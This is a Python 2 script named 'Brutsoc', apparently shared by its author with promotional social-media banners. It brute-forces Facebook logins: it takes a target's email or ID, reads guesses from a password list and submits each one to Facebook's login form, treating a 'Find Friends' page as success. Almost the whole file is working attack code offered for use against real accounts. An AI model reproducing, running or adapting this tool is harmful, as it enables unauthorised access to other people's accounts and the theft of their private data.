##Created By Anonise Xploit##
##visit me on Facebook: Anonise Xploit###
##visit on Twiter:xxx@anonisexx##
##follow me on Whatsapp###

##Import Option##
#import os
# import urllib.request
import time
import sys

if sys.version_info[0] !=2: 
	print('''--------------------------------------
	 SYSTEM REQUIRED :PYTHON 2.x
	 Worked On Linux,Termux,WSL
	use: python brutsoc.py
--------------------------------------
			''')
	sys.exit()
	
##url to post##
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()
def update_progress(progress):
    barLength = 50 # Modify this to change the length of the progress bar
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if not isinstance(progress, float):
        progress = 0
        status = "error: progress var must be float\r\n"
    if progress < 0:
        progress = 0
        status = "Halt...\r\n"
    if progress >= 1:
        progress = 1
        status = "Done...\r\n"
    block = int(round(barLength*progress))
    text = "\r [{0}] {1}% {2}".format( "#"*block + "-"*(barLength-block), progress*100, status)
    sys.stdout.write(text)
    sys.stdout.flush()

print "Loading.."
for i in range(101):
    time.sleep(0.01)
    update_progress(i/100.0)

print("Welcome to Brutsoc")
__banner__ = """                 ____             _                  
                | __ ) _ __ _   _| |_ ___  ___   ___ 
                |  _ \| '__| | | | __/ __|/ _ \ / __|
                | |_) | |  | |_| | |_\__ \ (_) | (__ 
                |____/|_|   \__,_|\__|___/\___/ \___|
                         ##written by @Anonise Xploit
                         ##subscribe my Youtube channel https://www.youtube.com/channel/UC2ON83m_nkGa668h3pH_JRA
                                                                                                      """       
print(__banner__)                                                                      
file=open('passwords.txt','r')

email=str(raw_input("\033[1;31;40m [*] Enter [Email|Phone|Username|ID]: \033[0m ").strip())

print "\n \033[1;33;40m {*}Targeted Email ID :\033[0m  ",email
print("\n \033[5;35;40m {*}Bruteforcing Targeted Email...!!\033[0m") 

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			if 'Find Friends' in response.read():
				print("\033[1;33;40m [****]Password Found:\033[0m "),passw
				break
	except:
               print("[!] Done .. !!")
	
###tHIS content is editable ....###
##@Anonise Xploit##
